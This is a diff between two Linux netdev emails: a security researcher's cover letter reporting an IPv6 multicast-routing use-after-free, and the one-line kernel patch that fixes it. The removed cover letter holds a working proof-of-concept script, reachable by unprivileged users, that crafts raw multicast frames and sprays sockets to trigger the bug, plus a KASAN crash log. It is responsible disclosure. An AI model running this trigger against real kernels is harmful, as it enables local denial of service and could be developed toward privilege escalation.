@@ -1,62 +1,64 @@
-Received: from mail-pl1-f172.google.com (mail-pl1-f172.google.com [209.85.214.172])
+Received: from mail-pl1-f179.google.com (mail-pl1-f179.google.com [209.85.214.179])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8C2EA26F2BE
-	for <netdev@vger.kernel.org>; Mon,  3 Aug 2026 02:47:28 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.172
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3074D2C21E6
+	for <netdev@vger.kernel.org>; Mon,  3 Aug 2026 02:47:32 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.179
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785725250; cv=none; b=UOGtZONiWAv7ruv+GYn7cLzdZRoJ3DTmHHcU4LTeez4GLWznO4xmEsUFWYId4hfPmhWOLZ9t7zSbXt0UQWNQkfLjMr5yNNVu5OVcXbeYToQKxt++rcx6nwmlqFncIpKcwrnBT7mmCtNgkZ4O22e7vPx81g2BXVVf6x4uW1qpSkQ=
+	t=1785725254; cv=none; b=LRWDE2z/73Lk/rWw0CcdAeQNx07cJwaLOACEq42iqLYhk1RuLO3fAjOJm7lfW/9JWP6a13DCz4N036AgW0S8wz7o9lFbLUV2Zp1hXtmwmKW/iCbRTSpQ8H3QTD0IqcuiC1IbwxPEZgHWSWGJ7/GjHX6cxQjBnOxpl9MDWOynwVk=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785725250; c=relaxed/simple;
-	bh=ktOOeCUppp9aQ/Cn4EPMcZHggCBePIiOZbJ8y2P4vKY=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=bvEA67nqvC0vOVEEE9fgeQNT/Qa1OOJBFGZ/DHdaivpLn2AcBW3qKTT2j8WNK46Ff+d2Dxjs4VFBONRTwbTV5/pqRhzsplq7Uy0BbU1pPdtGho+v3u2YF6MRbqUJJgNw2xs7Hb/u3Xtda9/5JMouJdeE5rXDwODrdSib0M59Nvg=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=lGOPpzRd; arc=none smtp.client-ip=209.85.214.172
+	s=arc-20240116; t=1785725254; c=relaxed/simple;
+	bh=3XdvKgSyqkaQZvwiXr+QcNzqxOOPME0iYWuu0z44QBc=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=bZ2k6A3NdxC7PRjio7/Lt4hJP+q4iiZvE5aD2QXhKozLKiOU0uGzEu0D/c5eXH5thlBthQrnaIO810gnx8u3w4UbYAjCeylbhJXD23fDIYGjfG+/Veg6ZiWOrM9GeNG0+prUB6cc4kkqJf/IVq9lZIbe9/SSew8eM4Xkn4nqh4w=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=b/iYjVrS; arc=none smtp.client-ip=209.85.214.179
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="lGOPpzRd"
-Received: by mail-pl1-f172.google.com with SMTP id d9443c01a7336-2ce87c7e3bbso29637045ad.1
-        for <netdev@vger.kernel.org>; Sun, 02 Aug 2026 19:47:28 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="b/iYjVrS"
+Received: by mail-pl1-f179.google.com with SMTP id d9443c01a7336-2cfff5f88dbso32018325ad.3
+        for <netdev@vger.kernel.org>; Sun, 02 Aug 2026 19:47:32 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1785725248; x=1786330048; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=UddWZVAsvawZoNIIq0ass9Br/7SpF5oWqG+HHR7uHyc=;
-        b=lGOPpzRdlF/zn3x3Hv14LlDA11C2DRASW3LbnoB1MNKuBHT4Jze7QmZiGnRChu3WhI
-         mwpYwG6p15AFTG2J0VpIgl5EPAigUf8bNzbp7UmzgCMKgbYBkD5AFYV8PpYLggxByhMn
-         /PBMNHq9mT6YcqqIf8ERlPhZeUXxlTyPtAHki8cQsTMpruoS/pczuc6lI1j7dZlVVFTb
-         Iw1zVSJ4wz3fqd+UUbDNVUFf3xAgZ/cPTZYU4HtQX5DXUBZp0XuFJYrUBs+5KfVdYXp8
-         bMngDoPh6ED0oRhaK+t/7qkseN3yUMBW7ORMnTIYVeQrmqgkohgrWRIFUJLDZL0mMoPK
-         Lwxw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785725248; x=1786330048;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1785725252; x=1786330052; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=UddWZVAsvawZoNIIq0ass9Br/7SpF5oWqG+HHR7uHyc=;
-        b=Ou41vK9InftUdJVj6TEC1LmJycgbQC9lwYZkTeyWC1EhfDbrfthHZM7auzYXVoNCtu
-         O9OOu7TdpE9SArQpes+KoT+4yCS4BkxtGOC2WKRKFC2BalbUiDFNs4A4X4X/S/xDXQ+d
-         sdxiAJ3QrBjLxjOR/MrxyG8rGsuNXBzTpzrD2EHDBu39M6wkuaZJzhgwuss+1CHYas0t
-         +GlXG5wUemspX0zyoXvPgWNU7SmzFmIsNFWadPggXumpoKS847bpeuPFRxgmFAvhScI2
-         eM6+XFBNPaTUk0EZtbkcjTfSo4j/5/VPBb9k+PHrJRzloBMK4sIUGyfSnzxhKN7GH9TT
-         27OA==
-X-Gm-Message-State: AOJu0Yw0JDAqBkx8avVDa+GXQCZp2X0Jt/eIovbPPjqkBTY9vDOhJfSG
-	W9bWm8kwjMeRRgdfFdKyhl+d+6fusROwZE3eWQGnDQ93WXEKhOLmwvo+9b+r3dyzx/BuwBWH5YL
-	TyZ5XTucMfjjrIw==
-X-Gm-Gg: AR+sD10nixhFt5tNpql427k5VvkI7XqpYYRWvLbYD43rtr9st2zlecy8rGEAZUQ5YFF
-	TFjCQWMQkS2a/tM/6Ycvc2H3Dq6xHxrHpe5y7VqhpTNV9+0VltvGrZsDUVNnXc4umeQ33oniezS
-	m1CEBDcs624NWm5qRNuYjgjaK1s5q0MW8tDgaH9spX+/7oFgRE7wapqEaKq0JneyIJ7T3FitJFE
-	tiAAZ9vB+o4KVwyd5p6Qw+OvLofiBTqfvseylmHs/clTA4/fkW96Br86+Fm1agCWx7ZOVtKOE63
-	lSiYzB1AcrYMN4kXF0ACGJvZbNVSmoDFj3h0wbk2mIHYr8SEcM3znQoaMurL6pG9KZHYgB5KrjK
-	ZS1o26w9g5LE5V3MDDtmpuB5XDeeLAtww3mP2fb/J7DE1XO6dWtV4OswBYEVl9BzfLCYy+p8lue
-	5LHuHNjaj6VwmwFsK8XWdiA+MXh5OD0WhdLMOQ2LgXLWsHbCja9OJGtnJofiR62qHe5cV2YMYIK
-	Q==
-X-Received: by 2002:a17:903:2f4d:b0:2cf:bf3e:4812 with SMTP id d9443c01a7336-2d0521ea899mr78739455ad.2.1785725247664;
-        Sun, 02 Aug 2026 19:47:27 -0700 (PDT)
+        bh=2LhsYoE2aoDY26ySe/Zrhjmgh4wBG/9x4kdWBWPLDhE=;
+        b=b/iYjVrSZfjMxh0Yim6ERsF7vvm95LPQB/T1h+PL7BsevQXtR3rTt1a7lP1mIEWmxy
+         lcu/FAwcR8SjJMVfqWREt/M4b96q5cEmku9yoQQUwJWcE1CYeoemOyucae7LKCyLYher
+         /umjHNGIyjEF8x9oehLEkD/14+7KBgy7X/TYKA5SZmkIh+oGgJ8uCD11Bomv3jhhSRPY
+         QLUeZ+7pCLtYUaANI5bFmnZUK+6PB7Uuf+qDOScnBNVXaenP2fG7EP2+S4tJwxuXaUHQ
+         4cJVGaG+PADcCmSLwfoQRE8T88brU4TjP0ylu7b9tv77vgCIEwbgC6E2I2HfNpFAvFE/
+         7uvQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1785725252; x=1786330052;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=2LhsYoE2aoDY26ySe/Zrhjmgh4wBG/9x4kdWBWPLDhE=;
+        b=RW8ONNTN03+N7ZmSAKK1yW/QOk+2t4/iv0p6zTXdgZyETCoOQC+NtmsA741kuoA26h
+         gHStBRzSYWiUjvBkdXP91JWWgbPv/Ud1X6Y+X2+9mrLGsNg/gkyqhyBXY1rTtS23SwTp
+         20fRPiiJmXYt5Z+HJclnNjFudwTyrUm9I2Fmh/ce2fQTS28fI9g3xLzZ0aMeuX7RHqVS
+         X6+EUH1nDl0hEYb5gJhegus+6by+9aAH7aSyLGNFofDQ27BPt8STB9+tlQZbxNElOqDI
+         eB0nm4xU4JWeWZRFJirezkYZ5tlZAp903GmyhvYqGxQFw1lBrDQADDENZGTlGQubvt+I
+         0s/A==
+X-Gm-Message-State: AOJu0YygpHcDK8LHO+upDXL8DUuE/FxRPbvURqDSUVISPTCmdHQcO2km
+	L34q/e3s84wsYR7wyf/W7XdT0og2wyCqX+2YUxVuIK5tkM8UFSpgmCnp3YxaKAlTLXOqAuw/Vhz
+	LnITXdJ1jFFkGvQ==
+X-Gm-Gg: AR+sD11c1alcA3QRXwdqDiJnTFMIOzlBpoTz/xOVKlCu0Mvxjqm/fd96Xc4dMAyxL/z
+	HygGJ7laQ8QrAHmZQTvajgslc0hEtH4EDyY60E58NF7+hi5GzjDjve6z5P12c9SOmWjt8tw4/+d
+	l9P/PTQc8MhCJ1AcoZAPETcqwX+piVbEFXLZgnn77bpJ/anojICzP6qasItMPQyWRLTGjL+L9xu
+	IrwkVmeHedadAgErZNw3ubdNWizxNtRViMAZqFmbGBoeT8yC1puD+gk45SEEFLnnOeAs5MC86VU
+	ARCVfPRlfe56CBK4UKS07+3g5me/tbjNn9xzOyz7uX2W+9HzaQCueE2uw6duLltm7ICOQdHs+49
+	9MBXqtNVP/oUTMFONY9aTPJrKlVsb3UcTZA3/5K0vCWzWBBRm692ymKc2bl1qR5f6WvI8IgcbUd
+	oyy8xWr70KnpbySuBE2zFrzuwZN65JTtmmYWivNHazf+EtdnujuUyMgMdSndOGeJRYWd7vG/HZi
+	w==
+X-Received: by 2002:a17:903:2f4d:b0:2c9:97a8:8c19 with SMTP id d9443c01a7336-2d052474babmr83366195ad.44.1785725252408;
+        Sun, 02 Aug 2026 19:47:32 -0700 (PDT)
 Received: from Roxy.localdomain ([202.8.9.242])
-        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d04b0eb5a3sm30896585ad.46.2026.08.02.19.47.23
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d04b0eb5a3sm30896585ad.46.2026.08.02.19.47.28
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sun, 02 Aug 2026 19:47:26 -0700 (PDT)
+        Sun, 02 Aug 2026 19:47:31 -0700 (PDT)
 From: Zhiling Zou <zhilinz@nebusec.ai>
 To: netdev@vger.kernel.org
 Cc: dsahern@kernel.org,
@@ -71,10 +73,12 @@ Cc: dsahern@kernel.org,
 	joe@wand.net.nz,
 	vega@nebusec.ai,
 	zhilinz@nebusec.ai
-Subject: [PATCH net 0/1] ipv6: orphan prefetched skb before ip6_mr_input
-Date: Mon,  3 Aug 2026 10:47:09 +0800
-Message-ID: <cover.1785724784.git.zhilinz@nebusec.ai>
+Subject: [PATCH net 1/1] ipv6: orphan prefetched skb before ip6_mr_input
+Date: Mon,  3 Aug 2026 10:47:10 +0800
+Message-ID: <02db4590d0161e31a789dcdfa8d1be1a3212ec2e.1785724784.git.zhilinz@nebusec.ai>
 X-Mailer: git-send-email 2.43.0
+In-Reply-To: <cover.1785724784.git.zhilinz@nebusec.ai>
+References: <cover.1785724784.git.zhilinz@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -83,274 +87,41 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
+ip6_rcv_core() keeps skb->sk alive when it was installed by early
+demux with sock_pfree so later receive-side code can use the prefetched
+socket under RCU. ip6_mc_input() breaks that assumption in the
+deliver == false path by handing the original skb to ip6_mr_input(),
+which can queue or forward it after the receive-side RCU section ends.
 
-We found and validated a issue in net/ipv6/ip6_input.c. The bug is
-reachable by a non-root user via user and net namespace.
-We've tested it, and it should not affect any other functionality.
+A UDPv6 early-demuxed multicast packet that is not locally deliverable
+but still enters multicast forwarding can therefore carry a dangling
+socket pointer into unresolved mroute cleanup and later hit
+sock_pfree() after the matched socket has already been destroyed.
 
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
+Orphan the original skb before giving it to ip6_mr_input() when there
+is no local delivery. The deliver == true path already uses
+skb_clone(), which clears skb->sk and the destructor state.
 
----- details below ----
-
-Bug details:
-
-ip6_rcv_core() preserves skb->sk when UDPv6 early demux installs a
-prefetched socket together with the sock_pfree destructor. In
-ip6_mc_input(), the multicast forwarding path takes the original skb in
-the deliver == false branch and passes it into ip6_mr_input() instead
-of cloning or orphaning it first.
-
-That original skb can then be queued in the unresolved multicast route
-queue. Once the receive-side RCU section ends, userspace can close the
-matched UDP socket before unresolved queue cleanup runs. When the queued
-skb is later freed during ip6mr_destroy_unres(), sock_pfree()
-dereferences the stale skb->sk and triggers the use-after-free.
-
-Reproducer:
-
-    chmod +x ~/poc.sh
-    unshare -Urn -- bash -lc ~/poc.sh
-
-We run the PoC in an x86 QEMU environment.
-
-------BEGIN poc.sh------
-
-#!/bin/bash
-set -euo pipefail
-
-GROUP_ADDR="${GROUP_ADDR:-ff0e::123}"
-SRC_ADDR="${SRC_ADDR:-2001:db8:1::2}"
-DST_ADDR="${DST_ADDR:-2001:db8:1::1}"
-SPORT="${SPORT:-31337}"
-DPORT="${DPORT:-42424}"
-IF_RX="${IF_RX:-v0}"
-IF_TX="${IF_TX:-v1}"
-COUNT="${COUNT:-1}"
-
-cleanup() {
-	ip link del "$IF_RX" 2>/dev/null || true
-}
-trap cleanup EXIT
-
-ip link del "$IF_RX" 2>/dev/null || true
-ip link add "$IF_RX" type veth peer name "$IF_TX"
-ip link set lo up
-ip link set "$IF_RX" up
-ip link set "$IF_TX" up
-ip -6 addr add "${DST_ADDR}/64" dev "$IF_RX" nodad
-ip -6 addr add "${SRC_ADDR}/64" dev "$IF_TX" nodad
-
-export GROUP_ADDR SRC_ADDR DST_ADDR SPORT DPORT IF_RX IF_TX COUNT
-
-python3 - <<'PY'
-import fcntl
-import ipaddress
-import os
-import socket
-import struct
-import sys
-import time
-
-SIOCGIFHWADDR = 0x8927
-SOL_IPV6 = socket.IPPROTO_IPV6
-MRT6_INIT = 200
-MRT6_ADD_MIF = 202
-
-GROUP = os.environ["GROUP_ADDR"]
-SRC_ADDR = os.environ["SRC_ADDR"]
-DST_ADDR = os.environ["DST_ADDR"]
-SPORT = int(os.environ["SPORT"])
-DPORT = int(os.environ["DPORT"])
-IF_RX = os.environ["IF_RX"]
-IF_TX = os.environ["IF_TX"]
-COUNT = int(os.environ["COUNT"])
-
-
-def get_hwaddr(ifname: str) -> bytes:
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        ifreq = struct.pack("256s", ifname.encode())
-        res = fcntl.ioctl(s.fileno(), SIOCGIFHWADDR, ifreq)
-        return res[18:24]
-    finally:
-        s.close()
-
-
-def csum(data: bytes) -> int:
-    if len(data) & 1:
-        data += b"\x00"
-    total = 0
-    for i in range(0, len(data), 2):
-        total += (data[i] << 8) + data[i + 1]
-    while total >> 16:
-        total = (total & 0xFFFF) + (total >> 16)
-    return (~total) & 0xFFFF
-
-
-def udp6_checksum(src: bytes, dst: bytes, udp: bytes, payload: bytes) -> int:
-    pseudo = src + dst + struct.pack("!I3xB", len(udp) + len(payload), socket.IPPROTO_UDP)
-    return csum(pseudo + udp + payload)
-
-
-rx_mac = get_hwaddr(IF_RX)
-tx_mac = get_hwaddr(IF_TX)
-tx_ifindex = socket.if_nametoindex(IF_TX)
-rx_ifindex = socket.if_nametoindex(IF_RX)
-src_ip = ipaddress.IPv6Address(SRC_ADDR).packed
-group_ip = ipaddress.IPv6Address(GROUP).packed
-
-print(f"[+] {IF_RX} ifindex={rx_ifindex} mac={rx_mac.hex(':')}")
-print(f"[+] {IF_TX} ifindex={tx_ifindex} mac={tx_mac.hex(':')}")
-
-mroute = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
-mroute.settimeout(1.0)
-mroute.setsockopt(SOL_IPV6, MRT6_INIT, struct.pack("@I", 1))
-mif = struct.pack("@HBBHI", 0, 0, 1, rx_ifindex, 0)
-mroute.setsockopt(SOL_IPV6, MRT6_ADD_MIF, mif)
-print("[+] Enabled IPv6 multicast routing and added ingress MIF")
-
-udp = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0)
-udp.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, IF_RX.encode() + b"\x00")
-udp.bind((GROUP, DPORT, 0, 0))
-udp.connect((SRC_ADDR, SPORT, 0, 0))
-print("[+] Bound UDP socket to multicast group and connected it to the sender")
-
-payload = b"UAF!"
-udp_len = 8 + len(payload)
-udp_hdr = struct.pack("!HHHH", SPORT, DPORT, udp_len, 0)
-udp_sum = udp6_checksum(src_ip, group_ip, udp_hdr, payload)
-udp_hdr = struct.pack("!HHHH", SPORT, DPORT, udp_len, udp_sum)
-ipv6_hdr = struct.pack("!IHBB16s16s", (6 << 28), udp_len, socket.IPPROTO_UDP, 64, src_ip, group_ip)
-eth_hdr = rx_mac + tx_mac + struct.pack("!H", 0x86DD)
-frame = eth_hdr + ipv6_hdr + udp_hdr + payload
-
-pkt = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x86DD))
-pkt.bind((IF_TX, 0))
-
-for i in range(COUNT):
-    pkt.send(frame)
-    print(f"[+] Sent crafted frame {i + 1}/{COUNT}")
-    time.sleep(0.05)
-
-try:
-    report = mroute.recv(4096)
-    print(f"[+] Received multicast-routing report ({len(report)} bytes)")
-except TimeoutError:
-    print("[-] Did not receive multicast-routing report before timeout", file=sys.stderr)
-
-udp.close()
-print("[+] Closed matched UDP socket; forcing a short grace-period window before mroute cleanup")
-for _ in range(16):
-    spray = []
-    for _ in range(64):
-        spray.append(socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0))
-    for s in spray:
-        s.close()
-time.sleep(1)
-print("[+] Closing the mroute socket to flush the unresolved queue")
-mroute.close()
-time.sleep(1)
-print("[-] No crash observed after mroute cleanup")
-PY
-
-------END poc.sh--------
-
-----BEGIN crash log----
-
-[  233.980031][T10483] page_owner tracks the page as allocated
-[  233.980997][T10483] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 10250, tgid 10250 (sshd-auth), ts 133770429918, free_ts 133706329619
-[  233.984140][T10483] page last free pid 10250 tgid 10250 stack trace:
-[  233.985380][T10483] Kernel panic - not syncing: KASAN: panic_on_warn set ...
-[  233.986371][T10483] CPU: 1 UID: 1028 PID: 10483 Comm: python3 Not tainted 6.12.95 #2
-[  233.987459][T10483] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  233.989090][T10483] Call Trace:
-[  233.989583][T10483]  <TASK>
-[  233.989996][T10483]  panic (build/../kernel/panic.c:108)
-[  233.990555][T10483]  ? __pfx_panic (build/../kernel/panic.c:740)
-[  233.991198][T10483]  ? rcu_is_watching (build/../include/linux/context_tracking.h:128 (discriminator 1) build/../kernel/rcu/tree.c:752 (discriminator 1))
-[  233.991902][T10483]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
-[  233.992689][T10483]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
-[  233.993399][T10483]  ? mark_held_locks (build/../kernel/locking/lockdep.c:4364 (discriminator 1))
-[  233.994058][T10483]  ? sock_pfree (build/../net/core/sock.c:3919)
-[  233.994697][T10483]  check_panic_on_warn (build/../kernel/panic.c:527 (discriminator 1))
-[  233.995387][T10483]  end_report (build/../include/linux/srcu.h:634 build/../include/trace/events/error_report.h:69 build/../include/trace/events/error_report.h:69 build/../mm/kasan/report.c:222)
-[  233.995994][T10483]  kasan_report (build/../mm/kasan/report.c:597)
-[  233.996621][T10483]  ? sock_pfree (build/../net/core/sock.c:3919)
-[  233.997277][T10483]  sock_pfree (build/../net/core/sock.c:3919)
-[  233.997878][T10483]  skb_release_head_state (build/../net/core/skbuff.c:1164)
-[  233.998614][T10483]  sk_skb_reason_drop (build/../include/linux/refcount.h:395 build/../include/linux/refcount.h:432 build/../include/linux/refcount.h:450 build/../include/linux/skbuff.h:1292 build/../net/core/skbuff.c:1212 build/../net/core/skbuff.c:1240)
-[  233.999304][T10483]  ip6mr_destroy_unres (build/../net/ipv6/ip6mr.c:783 build/../net/ipv6/ip6mr.c:810)
-[  234.000008][T10483]  mroute_clean_tables (build/../include/linux/instrumented.h:112 build/../include/asm-generic/bitops/instrumented-lock.h:57 build/../include/linux/bit_spinlock.h:40 build/../include/linux/rhashtable.h:328 build/../include/linux/rhashtable.h:1063 build/../include/linux/rhashtable.h:1144 build/../include/linux/rhashtable.h:1195 build/../net/ipv4/ipmr.c:1344)
-[  234.000780][T10483]  ? __pfx_mroute_clean_tables (build/../net/ipv4/ipmr.c:3147)
-[  234.001562][T10483]  ? do_raw_spin_lock (build/../arch/x86/include/asm/atomic.h:107 (discriminator 4) build/../include/linux/atomic/atomic-arch-fallback.h:2170 (discriminator 4) build/../include/linux/atomic/atomic-instrumented.h:1302 (discriminator 4) build/../include/asm-generic/qspinlock.h:111 (discriminator 4) build/../kernel/locking/spinlock_debug.c:116 (discriminator 4))
-[  234.002275][T10483]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
-[  234.003037][T10483]  ? nlmsg_notify (build/../include/net/netlink.h:1163 build/../include/net/netlink.h:1184 build/../net/netlink/af_netlink.c:2593)
-[  234.003689][T10483]  ip6mr_sk_done (build/../net/ipv6/ip6mr.c:1627 (discriminator 7))
-[  234.004359][T10483]  rawv6_close (build/../net/ipv6/raw.c:1163)
-[  234.004949][T10483]  inet_release (build/../net/ipv4/af_inet.c:443)
-[  234.005587][T10483]  __sock_release (build/../net/socket.c:722)
-[  234.006239][T10483]  sock_close (build/../net/socket.c:1514 (discriminator 1))
-[  234.006828][T10483]  __fput (build/../fs/file_table.c:505)
-[  234.007408][T10483]  __x64_sys_close (build/../fs/open.c:1501 (discriminator 1) build/../fs/open.c:1492 (discriminator 1) build/../fs/open.c:1492 (discriminator 1))
-[  234.008100][T10483]  do_syscall_64 (build/../include/linux/entry-common.h:109 (discriminator 2) build/../include/linux/entry-common.h:147 (discriminator 2) build/../include/linux/entry-common.h:178 (discriminator 2) build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
-[  234.008743][T10483]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
-[  234.009574][T10483] RIP: 0033:0x7f2cf3098687
-[  234.010187][T10483] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
-All code
-========
-   0:	48 89 fa             	mov    %rdi,%rdx
-   3:	4c 89 df             	mov    %r11,%rdi
-   6:	e8 58 b3 00 00       	call   0xb363
-   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
-  11:	59                   	pop    %rcx
-  12:	5e                   	pop    %rsi
-  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
-  17:	74 1a                	je     0x33
-  19:	5b                   	pop    %rbx
-  1a:	c3                   	ret
-  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
-  22:	00 
-  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
-  28:	0f 05                	syscall
-  2a:*	5b                   	pop    %rbx		<-- trapping instruction
-  2b:	c3                   	ret
-  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
-  33:	83 e2 39             	and    $0x39,%edx
-  36:	83 fa 08             	cmp    $0x8,%edx
-  39:	75 de                	jne    0x19
-  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63
-
-Code starting with the faulting instruction
-===========================================
-   0:	5b                   	pop    %rbx
-   1:	c3                   	ret
-   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
-   9:	83 e2 39             	and    $0x39,%edx
-   c:	83 fa 08             	cmp    $0x8,%edx
-   f:	75 de                	jne    0xffffffffffffffef
-  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
-[  234.013809][T10483] RSP: 002b:00007ffc31527620 EFLAGS: 00000202 ORIG_RAX: 0000000000000003
-[  234.015292][T10483] RAX: ffffffffffffffda RBX: 00007f2cf3004780 RCX: 00007f2cf3098687
-[  234.016667][T10483] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000003
-[  234.018064][T10483] RBP: 0000000000000003 R08: 0000000000000000 R09: 0000000000000000
-[  234.019365][T10483] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000a83590
-[  234.020465][T10483] R13: 00007f2cf3340180 R14: 0000000000000000 R15: 00007f2cf3340188
-[  234.021975][T10483]  </TASK>
-[  234.022699][T10483] Kernel Offset: disabled
-[  234.023317][T10483] Rebooting in 86400 seconds..
-
------END crash log-----
-
-Best regards,
-Zhiling Zou
-
-Zhiling Zou (1):
-  ipv6: orphan prefetched skb before ip6_mr_input
-
+Fixes: cf7fbe660f2d ("bpf: Add socket assign support")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Signed-off-by: Zhiling Zou <zhilinz@nebusec.ai>
+---
  net/ipv6/ip6_input.c | 1 +
  1 file changed, 1 insertion(+)
 
+diff --git a/net/ipv6/ip6_input.c b/net/ipv6/ip6_input.c
+index 8972863c93ee5..d332ec60f9150 100644
+--- a/net/ipv6/ip6_input.c
++++ b/net/ipv6/ip6_input.c
+@@ -622,6 +622,7 @@ int ip6_mc_input(struct sk_buff *skb)
+ 		if (deliver) {
+ 			skb2 = skb_clone(skb, GFP_ATOMIC);
+ 		} else {
++			skb_orphan(skb);
+ 			skb2 = skb;
+ 			skb = NULL;
+ 		}
 -- 
 2.43.0
+
